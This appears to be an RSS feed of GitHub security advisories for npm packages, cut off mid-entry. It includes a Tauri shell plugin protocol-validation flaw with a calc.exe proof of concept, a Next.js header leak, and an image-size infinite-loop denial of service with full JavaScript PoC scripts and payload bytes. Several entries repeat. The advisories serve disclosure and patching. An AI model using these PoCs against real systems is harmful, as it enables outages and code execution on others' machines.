<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/npm.rss</id>
    <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
    <updated>2025-04-04T03:12:39.690Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
    <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[@tauri-apps/plugin-shell] Improper Scope Validation in the `open` Endpoint of `tauri-plugin-shell`]]></title>
        <id>https://github.com/advisories/GHSA-c9pr-q8gx-3mgp</id>
        <link href="https://github.com/advisories/GHSA-c9pr-q8gx-3mgp"/>
        <updated>2025-04-03T13:26:09.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The Tauri <a href="https://tauri.app/plugin/shell/"><code>shell</code></a>  plugin exposes functionality to execute code and open programs on the system. The <a href="https://tauri.app/reference/javascript/shell/#open"><code>open</code></a> endpoint of this plugin is designed to allow open functionality with the system opener (e.g. 
 <code>xdg-open</code> on Linux). This was meant to be restricted to a reasonable number of protocols like <code>https</code> or <code>mailto</code> by default.</p>
<p>This default restriction was not functional due to improper validation of the allowed protocols, allowing for potentially dangerous protocols like <code>file://</code>, <code>smb://</code>, or <code>nfs://</code> and others  to be opened by the system registered protocol handler.</p>
<p>By passing untrusted user input to the <code>open</code> endpoint these potentially dangerous protocols can be abused to gain remote code execution on the system. This either requires direct exposure of the endpoint to application users or code execution in the frontend of a Tauri application.</p>
<p>You are not affected if you have explicitly configured a validation regex or manually set the <code>open</code> endpoint to <code>true</code> in the plugin configuration. </p>
<p>Technically the scope was never a limitation for the rust side as it is not seen as an enforceable security boundary but we decided to mark the rust crate as affected since the plugin does not need to be a frontend dependency to be exposed.</p>
<h3 id="patches">Patches</h3>
<p>The issue has been patched in the <code>2.2.1</code> version of the plugin.
The plugin now differentiates between an unset scope and an explicit validation disable for the <code>open</code> endpoint.</p>
<h3 id="workarounds">Workarounds</h3>
<p>A way to prevent arbitrary protocols would be setting the shell plugin configuration value <code>open</code> to <code>true</code>.</p>
<p><code>tauri.conf.json</code></p>
<pre><code class="language-json5">"plugins": {
    "shell": {
          "open": true
     },
}
</code></pre>
<p>The above will only allow <code>mailto</code>, <code>http</code> and <code>https</code> links to be opened.</p>
<p>If the <code>open</code> endpoint should not be allowed at all there are two possible workarounds.</p>
<ul>
<li>Defining a non matching regex like <code>tauri^</code> in the plugin configuration</li>
<li>Removing <code>shell:default</code> and all instances of <code>shell:allow-open</code> from the <a href="https://tauri.app/security/capabilities/"><code>capabilities</code></a></li>
</ul>
<p>Alternatively we recommend usage of the <a href="https://tauri.app/plugin/opener/"><code>opener</code></a>  plugin, as the shell plugin deprecated the <code>open</code> endpoint previously.</p>
<h3 id="references">References</h3>
<h4 id="poc">PoC</h4>
<p>This is a windows specific proof of concept.</p>
<ol>
<li>Use <code>create-tauri-app</code> to make a new Tauri app.</li>
<li>Run <code>tauri add shell</code> to add the shell plugin.</li>
<li>Execute <code>await window.__TAURI_INTERNALS__.invoke("plugin:shell|open", {path: "file:///c:/windows/system32/calc.exe"});</code> in the developer console.</li>
<li>Observe the calculator being executed</li>
</ol>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/tauri-apps/plugins-workspace/security/advisories/GHSA-c9pr-q8gx-3mgp">https://github.com/tauri-apps/plugins-workspace/security/advisories/GHSA-c9pr-q8gx-3mgp</a></li>
<li><a href="https://github.com/tauri-apps/plugins-workspace/commit/9cf0390a52497e273db1a1b613a0e26827aa327c">https://github.com/tauri-apps/plugins-workspace/commit/9cf0390a52497e273db1a1b613a0e26827aa327c</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-31477">https://nvd.nist.gov/vuln/detail/CVE-2025-31477</a></li>
<li><a href="https://github.com/advisories/GHSA-c9pr-q8gx-3mgp">https://github.com/advisories/GHSA-c9pr-q8gx-3mgp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-c9pr-q8gx-3mgp</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2025-04-02T22:36:45.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[next] Next.js may leak x-middleware-subrequest-id to external hosts]]></title>
        <id>https://github.com/advisories/GHSA-223j-4rm8-mrmf</id>
        <link href="https://github.com/advisories/GHSA-223j-4rm8-mrmf"/>
        <updated>2025-04-03T13:24:27.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>In the process of remediating <a href="https://github.com/advisories/GHSA-f82v-jwr5-mffw">CVE-2025-29927</a>, we looked at other possible exploits of Middleware. We independently verified this low severity vulnerability in parallel with two reports from independent researchers.</p>
<p>Learn more <a href="https://vercel.com/changelog/cve-2025-30218-5DREmEH765PoeAsrNNQj3O">here</a>.</p>
<h2 id="credit">Credit</h2>
<p>Thank you to Jinseo Kim <a href="https://hackerone.com/kjsman?type=user">kjsman</a> and&nbsp;<a href="https://hackerone.com/ryotak?type=user">RyotaK</a> (GMO Flatt Security Inc.) with <a href="https://takumi-san.ai">takumi-san.ai</a>&nbsp;for the responsible disclosure. These researchers were awarded as part of our bug bounty program.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vercel/next.js/security/advisories/GHSA-223j-4rm8-mrmf">https://github.com/vercel/next.js/security/advisories/GHSA-223j-4rm8-mrmf</a></li>
<li><a href="https://vercel.com/changelog/cve-2025-30218-5DREmEH765PoeAsrNNQj3O">https://vercel.com/changelog/cve-2025-30218-5DREmEH765PoeAsrNNQj3O</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-30218">https://nvd.nist.gov/vuln/detail/CVE-2025-30218</a></li>
<li><a href="https://github.com/advisories/GHSA-223j-4rm8-mrmf">https://github.com/advisories/GHSA-223j-4rm8-mrmf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-223j-4rm8-mrmf</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2025-04-02T22:35:37.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[next] Next.js may leak x-middleware-subrequest-id to external hosts]]></title>
        <id>https://github.com/advisories/GHSA-223j-4rm8-mrmf</id>
        <link href="https://github.com/advisories/GHSA-223j-4rm8-mrmf"/>
        <updated>2025-04-03T13:24:27.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>In the process of remediating <a href="https://github.com/advisories/GHSA-f82v-jwr5-mffw">CVE-2025-29927</a>, we looked at other possible exploits of Middleware. We independently verified this low severity vulnerability in parallel with two reports from independent researchers.</p>
<p>Learn more <a href="https://vercel.com/changelog/cve-2025-30218-5DREmEH765PoeAsrNNQj3O">here</a>.</p>
<h2 id="credit">Credit</h2>
<p>Thank you to Jinseo Kim <a href="https://hackerone.com/kjsman?type=user">kjsman</a> and&nbsp;<a href="https://hackerone.com/ryotak?type=user">RyotaK</a> (GMO Flatt Security Inc.) with <a href="https://takumi-san.ai">takumi-san.ai</a>&nbsp;for the responsible disclosure. These researchers were awarded as part of our bug bounty program.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vercel/next.js/security/advisories/GHSA-223j-4rm8-mrmf">https://github.com/vercel/next.js/security/advisories/GHSA-223j-4rm8-mrmf</a></li>
<li><a href="https://vercel.com/changelog/cve-2025-30218-5DREmEH765PoeAsrNNQj3O">https://vercel.com/changelog/cve-2025-30218-5DREmEH765PoeAsrNNQj3O</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-30218">https://nvd.nist.gov/vuln/detail/CVE-2025-30218</a></li>
<li><a href="https://github.com/advisories/GHSA-223j-4rm8-mrmf">https://github.com/advisories/GHSA-223j-4rm8-mrmf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-223j-4rm8-mrmf</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2025-04-02T22:35:37.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[next] Next.js may leak x-middleware-subrequest-id to external hosts]]></title>
        <id>https://github.com/advisories/GHSA-223j-4rm8-mrmf</id>
        <link href="https://github.com/advisories/GHSA-223j-4rm8-mrmf"/>
        <updated>2025-04-03T13:24:27.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>In the process of remediating <a href="https://github.com/advisories/GHSA-f82v-jwr5-mffw">CVE-2025-29927</a>, we looked at other possible exploits of Middleware. We independently verified this low severity vulnerability in parallel with two reports from independent researchers.</p>
<p>Learn more <a href="https://vercel.com/changelog/cve-2025-30218-5DREmEH765PoeAsrNNQj3O">here</a>.</p>
<h2 id="credit">Credit</h2>
<p>Thank you to Jinseo Kim <a href="https://hackerone.com/kjsman?type=user">kjsman</a> and&nbsp;<a href="https://hackerone.com/ryotak?type=user">RyotaK</a> (GMO Flatt Security Inc.) with <a href="https://takumi-san.ai">takumi-san.ai</a>&nbsp;for the responsible disclosure. These researchers were awarded as part of our bug bounty program.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vercel/next.js/security/advisories/GHSA-223j-4rm8-mrmf">https://github.com/vercel/next.js/security/advisories/GHSA-223j-4rm8-mrmf</a></li>
<li><a href="https://vercel.com/changelog/cve-2025-30218-5DREmEH765PoeAsrNNQj3O">https://vercel.com/changelog/cve-2025-30218-5DREmEH765PoeAsrNNQj3O</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-30218">https://nvd.nist.gov/vuln/detail/CVE-2025-30218</a></li>
<li><a href="https://github.com/advisories/GHSA-223j-4rm8-mrmf">https://github.com/advisories/GHSA-223j-4rm8-mrmf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-223j-4rm8-mrmf</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2025-04-02T22:35:37.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[next] Next.js may leak x-middleware-subrequest-id to external hosts]]></title>
        <id>https://github.com/advisories/GHSA-223j-4rm8-mrmf</id>
        <link href="https://github.com/advisories/GHSA-223j-4rm8-mrmf"/>
        <updated>2025-04-03T13:24:27.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>In the process of remediating <a href="https://github.com/advisories/GHSA-f82v-jwr5-mffw">CVE-2025-29927</a>, we looked at other possible exploits of Middleware. We independently verified this low severity vulnerability in parallel with two reports from independent researchers.</p>
<p>Learn more <a href="https://vercel.com/changelog/cve-2025-30218-5DREmEH765PoeAsrNNQj3O">here</a>.</p>
<h2 id="credit">Credit</h2>
<p>Thank you to Jinseo Kim <a href="https://hackerone.com/kjsman?type=user">kjsman</a> and&nbsp;<a href="https://hackerone.com/ryotak?type=user">RyotaK</a> (GMO Flatt Security Inc.) with <a href="https://takumi-san.ai">takumi-san.ai</a>&nbsp;for the responsible disclosure. These researchers were awarded as part of our bug bounty program.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vercel/next.js/security/advisories/GHSA-223j-4rm8-mrmf">https://github.com/vercel/next.js/security/advisories/GHSA-223j-4rm8-mrmf</a></li>
<li><a href="https://vercel.com/changelog/cve-2025-30218-5DREmEH765PoeAsrNNQj3O">https://vercel.com/changelog/cve-2025-30218-5DREmEH765PoeAsrNNQj3O</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-30218">https://nvd.nist.gov/vuln/detail/CVE-2025-30218</a></li>
<li><a href="https://github.com/advisories/GHSA-223j-4rm8-mrmf">https://github.com/advisories/GHSA-223j-4rm8-mrmf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-223j-4rm8-mrmf</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2025-04-02T22:35:37.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[image-size] image-size Denial of Service via Infinite Loop during Image Processing]]></title>
        <id>https://github.com/advisories/GHSA-m5qc-5hw7-8vg7</id>
        <link href="https://github.com/advisories/GHSA-m5qc-5hw7-8vg7"/>
        <updated>2025-04-02T15:04:59.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>image-size</code> is vulnerable to a Denial of Service vulnerability when processing specially crafted images.</p>
<p>The issue occurs because of an infine loop in <code>findBox</code> when processing certain images with a box with size <code>0</code>.</p>
<h3 id="details">Details</h3>
<p>If the first bytes of the input does not match any bytes in <code>firstBytes</code>, then the package tries to validate the image using other handlers:</p>
<pre><code class="language-js">// https://github.com/image-size/image-size/blob/v1.2.0/lib/detector.ts#L20-L31
export function detector(input: Uint8Array): imageType | undefined {
  const byte = input[0]
  if (byte in firstBytes) {
    const type = firstBytes[byte]
    if (type &amp;&amp; typeHandlers[type].validate(input)) {
      return type
    }
  }

  const finder = (key: imageType) =&gt; typeHandlers[key].validate(input) //&lt;--
  return keys.find(finder)
}
</code></pre>
<p>Some handlers that call <code>findBox</code> to validate or calculate the image size are <code>jxl</code>, <code>heif</code> and <code>jp2</code>.</p>
<p><code>JXL</code> handler calls <code>findBox</code> inside <code>validate</code>. To reach the <code>findBox</code> call, the value at position <code>4:8</code> should be <code>'JXL '</code></p>
<pre><code class="language-js">// https://github.com/image-size/image-size/blob/v1.2.0/lib/types/jxl.ts#L51-L60
export const JXL: IImage = {
  validate: (input: Uint8Array): boolean =&gt; {
    const boxType = toUTF8String(input, 4, 8)
    if (boxType !== 'JXL ') return false      //&lt;---

    const ftypBox = findBox(input, 'ftyp', 0) //&lt;---
    if (!ftypBox) return false

    const brand = toUTF8String(input, ftypBox.offset + 8, ftypBox.offset + 12)
    return brand === 'jxl '
  },
</code></pre>
<p><code>findBox</code> can lead to an infine loop because the value of <code>box.size</code> is <code>0</code>, thus the <code>offset</code> variable is not updated. Below relevant code with comments (using one of the <code>PAYLOAD</code> below as example):</p>
<pre><code class="language-js">// https://github.com/image-size/image-size/blob/v1.2.0/lib/types/utils.ts#L33-L37
export const readUInt32BE = (input: Uint8Array, offset = 0) =&gt;
  input[offset] * 2 ** 24 +     // 0 +
  input[offset + 1] * 2 ** 16 + // 0 +
  input[offset + 2] * 2 ** 8 +  // 0 +
  input[offset + 3]             // 0

// https://github.com/image-size/image-size/blob/v1.2.0/lib/types/utils.ts#L66-L75
function readBox(input: Uint8Array, offset: number) {   // offset: 0
  if (input.length - offset &lt; 4) return
  const boxSize = readUInt32BE(input, offset)           // 0
  if (input.length - offset &lt; boxSize) return           // (8 - 0) &lt; 0 =&gt; false
  return {
    name: toUTF8String(input, 4 + offset, 8 + offset),  // 'JXL '
    offset,                                             // 0
    size: boxSize,                                      // 0
  }
}

// https://github.com/image-size/image-size/blob/v1.2.0/lib/types/utils.ts#L77-L84
export function findBox(input: Uint8Array, boxName: string, offset: number) { // boxName: 'ftyp', offset: 0
  while (offset &lt; input.length) {         // 0 &lt; 8 =&gt; false
    const box = readBox(input, offset)    // { name: 'JXL ', offset: 0, size: 0 }
    if (!box) break                       // false
    if (box.name === boxName) return box  // 'JXL ' === 'ftyp' =&gt; false
    offset += box.size                    // offset += 0
  }
}
</code></pre>
<p>A similar issue occurs for <code>HEIF</code> and <code>JP2</code> handlers:</p>
<ul>
<li><a href="https://github.com/image-size/image-size/blob/v1.2.0/lib/types/heif.ts">https://github.com/image-size/image-size/blob/v1.2.0/lib/types/heif.ts</a></li>
<li><a href="https://github.com/image-size/image-size/blob/v1.2.0/lib/types/jp2.ts">https://github.com/image-size/image-size/blob/v1.2.0/lib/types/jp2.ts</a></li>
</ul>
<h3 id="poc">PoC</h3>
<p>Usage:</p>
<pre><code class="language-bash">node main.js poc1|poc2
</code></pre>
<ul>
<li>poc for <code>image-size@2.0.1</code></li>
</ul>
<pre><code class="language-js">// mkdir 2.0.1
// cd 2.0.1/
// npm i image-size@2.0.1
const {imageSizeFromFile} = require("image-size/fromFile");
const {imageSize} = require("image-size");

const fs = require('fs');

// JXL
const PAYLOAD = new Uint8Array([
  0x00, 0x00, 0x00, 0x00, // Box with size 0
  0x4A, 0x58, 0x4C, 0x20, // "JXL "
]);

// HEIF
// const PAYLOAD = new Uint8Array([
//   0x00, 0x00, 0x00, 0x00, // Box with size 0
//   0x66, 0x74, 0x79, 0x70, // "ftyp"
//   0x61, 0x76, 0x69, 0x66  // "avif"
// ]);

// JP2
// const PAYLOAD = new Uint8Array([
//   0x00, 0x00, 0x00, 0x00, // Box with size 0
//   0x6A, 0x50, 0x20, 0x20, // "jP  "
// ]);

const FILENAME = "./poc.svg"

function createPayload() {
  fs.writeFileSync(FILENAME, PAYLOAD);
}

function poc1() { 
  (async () =&gt; {
    await imageSizeFromFile(FILENAME)
    console.log('Done') // never executed
  })();
}

function poc2() {
  imageSize(PAYLOAD)
  console.log('Done') // never executed
}

const pocs = new Map();
pocs.set('poc1', poc1); // node main.js poc1
pocs.set('poc2', poc2); // node main.js poc2

async function run() {
  createPayload()
  const args = process.argv.slice(2);
  const t = args[0];
  const poc = pocs.get(t) || poc1;
  console.log(`Running poc....`)
  await poc();
}

run();
</code></pre>
<ul>
<li>poc for <code>image-size@1.2.0</code></li>
</ul>
<pre><code class="language-js">// mkdir 1.2.0
// cd 1.2.0/
// npm i image-size@1.2.0
const sizeOf = require("image-size");
const fs = require('fs');

// JXL
const PAYLOAD = new Uint8Array([
  0x00, 0x00, 0x00, 0x00, // Box with size 0
  0x4A, 0x58, 0x4C, 0x20, // "JXL "
]);

// HEIF
// const PAYLOAD = new Uint8Array([
//   0x00, 0x00, 0x00, 0x00, // Box with size 0
//   0x66, 0x74, 0x79, 0x70, // "ftyp"
//   0x61, 0x76, 0x69, 0x66  // "avif"
// ]);

// JP2
// const PAYLOAD = new Uint8Array([
//   0x00, 0x00, 0x00, 0x00, // Box with size 0
//   0x6A, 0x50, 0x20, 0x20, // "jP  "
// ]);

const FILENAME = "./poc.svg"

function createPayload() {
  fs.writeFileSync(FILENAME, PAYLOAD);
}

function poc1() {
  sizeOf(FILENAME)
  console.log('Done') // never executed
}

function poc2() {
  sizeOf(PAYLOAD)
  console.log('Done') // never executed
}

const pocs = new Map();
pocs.set('poc1', poc1); // node main.js poc1
pocs.set('poc2', poc2); // node main.js poc2

async function run() {
  createPayload()
  const args = process.argv.slice(2);
  const t = args[0];
  const poc = pocs.get(t) || poc1;
  console.log(`Running poc....`)
  await poc();
}

run();
</code></pre>
<ul>
<li>poc for <code>image-size@1.1.1</code></li>
</ul>
<pre><code class="language-js">// mkdir 1.1.1
// cd 1.1.1/
// npm i image-size@1.1.1
const sizeOf = require("image-size");
const fs = require('fs');

// HEIF
const PAYLOAD = new Uint8Array([
  0x00, 0x00, 0x00, 0x00, // Box with size 0
  0x66, 0x74, 0x79, 0x70, // "ftyp"
  0x61, 0x76, 0x69, 0x66  // "avif"
]);

const FILENAME = "./poc.svg"

function createPayload() {
  fs.writeFileSync(FILENAME, PAYLOAD);
}

function poc1() {
  sizeOf(FILENAME)
  console.log('Done') // never executed
}

function poc2() {
  sizeOf(PAYLOAD)
  console.log('Done') // never executed
}

const pocs = new Map();
pocs.set('poc1', poc1); // node main.js poc1
pocs.set('poc2', poc2); // node main.js poc2

async function run() {
  createPayload()
  const args = process.argv.slice(2);
  const t = args[0];
  const poc = pocs.get(t) || poc1;
  console.log(`Running poc....`)
  await poc();
}

run();
</code></pre>
<h3 id="impact">Impact</h3>
<p>Denial of Service</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/image-size/image-size/security/advisories/GHSA-m5qc-5hw7-8vg7">https://github.com/image-size/image-size/security/advisories/GHSA-m5qc-5hw7-8vg7</a></li>
<li><a href="https://github.com/image-size/image-size/commit/8994131c7c3ee8da1699e04700c95e0e683a0c68">https://github.com/image-size/image-size/commit/8994131c7c3ee8da1699e04700c95e0e683a0c68</a></li>
<li><a href="https://github.com/advisories/GHSA-m5qc-5hw7-8vg7">https://github.com/advisories/GHSA-m5qc-5hw7-8vg7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-m5qc-5hw7-8vg7</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-04-02T15:04:58.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[image-size] image-size Denial of Service via Infinite Loop during Image Processing]]></title>
        <id>https://github.com/advisories/GHSA-m5qc-5hw7-8vg7</id>
        <link href="https://github.com/advisories/GHSA-m5qc-5hw7-8vg7"/>
        <updated>2025-04-02T15:04:59.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>image-size</code> is vulnerable to a Denial of Service vulnerability when processing specially crafted images.</p>
<p>The issue occurs because of an infine loop in <code>findBox</code> when processing certain images with a box with size <code>0</code>.</p>
<h3 id="details">Details</h3>
<p>If the first bytes of the input does not match any bytes in <code>firstBytes</code>, then the package tries to validate the image using other handlers:</p>
<pre><code class="language-js">// https://github.com/image-size/image-size/blob/v1.2.0/lib/detector.ts#L20-L31
export function detector(input: Uint8Array): imageType | undefined {
  const byte = input[0]
  if (byte in firstBytes) {
    const type = firstBytes[byte]
    if (type &amp;&amp; typeHandlers[type].validate(input)) {
      return type
    }
  }

  const finder = (key: imageType) =&gt; typeHandlers[key].validate(input) //&lt;--
  return keys.find(finder)
}
</code></pre>
<p>Some handlers that call <code>findBox</code> to validate or calculate the image size are <code>jxl</code>, <code>heif</code> and <code>jp2</code>.</p>
<p><code>JXL</code> handler calls <code>findBox</code> inside <code>validate</code>. To reach the <code>findBox</code> call, the value at position <code>4:8</code> should be <code>'JXL '</code></p>
<pre><code class="language-js">// https://github.com/image-size/image-size/blob/v1.2.0/lib/types/jxl.ts#L51-L60
export const JXL: IImage = {
  validate: (input: Uint8Array): boolean =&gt; {
    const boxType = toUTF8String(input, 4, 8)
    if (boxType !== 'JXL ') return false      //&lt;---

    const ftypBox = findBox(input, 'ftyp', 0) //&lt;---
    if (!ftypBox) return false

    const brand = toUTF8String(input, ftypBox.offset + 8, ftypBox.offset + 12)
    return brand === 'jxl '
  },
</code></pre>
<p><code>findBox</code> can lead to an infine loop because the value of <code>box.size</code> is <code>0</code>, thus the <code>offset</code> variable is not updated. Below relevant code with comments (using one of the <code>PAYLOAD</code> below as example):</p>
<pre><code class="language-js">// https://github.com/image-size/image-size/blob/v1.2.0/lib/types/utils.ts#L33-L37
export const readUInt32BE = (input: Uint8Array, offset = 0) =&gt;
  input[offset] * 2 ** 24 +     // 0 +
  input[offset + 1] * 2 ** 16 + // 0 +
  input[offset + 2] * 2 ** 8 +  // 0 +
  input[offset + 3]             // 0

// https://github.com/image-size/image-size/blob/v1.2.0/lib/types/utils.ts#L66-L75
function readBox(input: Uint8Array, offset: number) {   // offset: 0
  if (input.length - offset &lt; 4) return
  const boxSize = readUInt32BE(input, offset)           // 0
  if (input.length - offset &lt; boxSize) return           // (8 - 0) &lt; 0 =&gt; false
  return {
    name: toUTF8String(input, 4 + offset, 8 + offset),  // 'JXL '
    offset,                                             // 0
    size: boxSize,                                      // 0
  }
}

// https://github.com/image-size/image-size/blob/v1.2.0/lib/types/utils.ts#L77-L84
export function findBox(input: Uint8Array, boxName: string, offset: number) { // boxName: 'ftyp', offset: 0
  while (offset &lt; input.length) {         // 0 &lt; 8 =&gt; false
    const box = readBox(input, offset)    // { name: 'JXL ', offset: 0, size: 0 }
    if (!box) break                       // false
    if (box.name === boxName) return box  // 'JXL ' === 'ftyp' =&gt; false
    offset += box.size                    // offset += 0
  }
}
</code></pre>
<p>A similar issue occurs for <code>HEIF</code> and <code>JP2</code> handlers:</p>
<ul>
<li><a href="https://github.com/image-size/image-size/blob/v1.2.0/lib/types/heif.ts">https://github.com/image-size/image-size/blob/v1.2.0/lib/types/heif.ts</a></li>
<li><a href="https://github.com/image-size/image-size/blob/v1.2.0/lib/types/jp2.ts">https://github.com/image-size/image-size/blob/v1.2.0/lib/types/jp2.ts</a></li>
</ul>
<h3 id="poc">PoC</h3>
<p>Usage:</p>
<pre><code class="language-bash">node main.js poc1|poc2
</code></pre>
<ul>
<li>poc for <code>image-size@2.0.1</code></li>
</ul>
<pre><code class="language-js">// mkdir 2.0.1
// cd 2.0.1/
// npm i image-size@2.0.1
const {imageSizeFromFile} = require("image-size/fromFile");
const {imageSize} = require("image-size");

const fs = require('fs');

// JXL
const PAYLOAD = new Uint8Array([
  0x00, 0x00, 0x00, 0x00, // Box with size 0
  0x4A, 0x58, 0x4C, 0x20, // "JXL "
]);

// HEIF
// const PAYLOAD = new Uint8Array([
//   0x00, 0x00, 0x00, 0x00, // Box with size 0
//   0x66, 0x74, 0x79, 0x70, // "ftyp"
//   0x61, 0x76, 0x69, 0x66  // "avif"
// ]);

// JP2
// const PAYLOAD = new Uint8Array([
//   0x00, 0x00, 0x00, 0x00, // Box with size 0
//   0x6A, 0x50, 0x20, 0x20, // "jP  "
// ]);

const FILENAME = "./poc.svg"

function createPayload() {
  fs.writeFileSync(FILENAME, PAYLOAD);
}

function poc1() { 
  (async () =&gt; {
    await imageSizeFromFile(FILENAME)
    console.log('Done') // never executed
  })();
}

function poc2() {
  imageSize(PAYLOAD)
  console.log('Done') // never executed
}

const pocs = new Map();
pocs.set('poc1', poc1); // node main.js poc1
pocs.set('poc2', poc2); // node main.js poc2

async function run() {
  createPayload()
  const args = process.argv.slice(2);
  const t = args[0];
  const poc = pocs.get(t) || poc1;
  console.log(`Running poc....`)
  await poc();
}

run();
</code></pre>
<ul>
<li>poc for <code>image-size@1.2.0</code></li>
</ul>
<pre><code class="language-js">// mkdir 1.2.0
// cd 1.2.0/
// npm i image-size@1.2.0
const sizeOf = require("image-size");
const fs = require('fs');

// JXL
const PAYLOAD = new Uint8Array([
  0x00, 0x00, 0x00, 0x00, // Box with size 0
  0x4A, 0x58, 0x4C, 0x20, // "JXL "
]);

// HEIF
// const PAYLOAD = new Uint8Array([
//   0x00, 0x00, 0x00, 0x00, // Box with size 0
//   0x66, 0x74, 0x79, 0x70, // "ftyp"
//   0x61, 0x76, 0x69, 0x66  // "avif"
// ]);

// JP2
// const PAYLOAD = new Uint8Array([
//   0x00, 0x00, 0x00, 0x00, // Box with size 0
//   0x6A, 0x50, 0x20, 0x20, // "jP  "
// ]);

const FILENAME = "./poc.svg"

function createPayload() {
  fs.writeFileSync(FILENAME, PAYLOAD);
}

function poc1() {
  sizeOf(FILENAME)
  console.log('Done') // never executed
}

function poc2() {
  sizeOf(PAYLOAD)
  console.log('Done') // never executed
}

const pocs = new Map();
pocs.set('poc1', poc1); // node main.js poc1
pocs.set('poc2', poc2); // node main.js poc2

async function run() {
  createPayload()
  const args = process.argv.slice(2);
  const t = args[0];
  const poc = pocs.get(t) || poc1;
  console.log(`Running poc....`)
  await poc();
}

run();
</code></pre>
<ul>
<li>poc for <code>image-size@1.1.1</code></li>
</ul>
<pre><code class="language-js">// mkdir 1.1.1
// cd 1.1.1/
// npm i image-size@1.1.1
const sizeOf = require("image-size");
const fs = require('fs');

// HEIF
const PAYLOAD = new Uint8Array([
  0x00, 0x00, 0x00, 0x00, // Box with size 0
  0x66, 0x74, 0x79, 0x70, // "ftyp"
  0x61, 0x76, 0x69, 0x66  // "avif"
]);

const FILENAME = "./poc.svg"

function createPayload() {
  fs.writeFileSync(FILENAME, PAYLOAD);
}

function poc1() {
  sizeOf(FILENAME)
  console.log('Done') // never executed
}

function poc2() {
  sizeOf(PAYLOAD)
  console.log('Done') // never executed
}

const pocs = new Map();
pocs.set('poc1', poc1); // node main.js poc1
pocs.set('poc2', poc2); // node main.js poc2

async function run() {
  createPayload()
  const args = process.argv.slice(2);
  const t = args[0];
  const poc = pocs.get(t) || poc1;
  console.log(`Running poc....`)
  await poc();
}

run();
</code></pre>
<h3 id="impact">Impact</h3>
<p>Denial of Service</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/image-size/image-size/security/advisories/GHSA-m5qc-5hw7-8vg7">https://github.com/image-size/image-size/security/advisories/GHSA-m5qc-5hw7-8vg7</a></li>
<li><a href="https://github.com/image-size/image-size/commit/8994131c7c3ee8da1699e04700c95e0e683a0c68">https://github.com/image-size/image-size/commit/8994131c7c3ee8da1699e04700c95e0e683a0c68</a></li>
<li><a href="https://github.com/advisories/GHSA-m5qc-5hw7-8vg7">https://github.com/advisories/GHSA-m5qc-5hw7-8vg7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-m5qc-5hw7-8vg7</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-04-02T15:04:58.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mathlive] Duplicate Advisory: MathLive's Lack of Escaping of HTML allows for XSS]]></title>
        <id>https://github.com/advisories/GHSA-929m-phjg-qwcc</id>
        <link href="https://github.com/advisories/GHSA-929m-phjg-qwcc"/>
        <updated>2025-04-02T00:33:16.000Z</updated>
        <content type="html"><![CDATA[<h3 id="duplicate-advisory">Duplicate Advisory</h3>
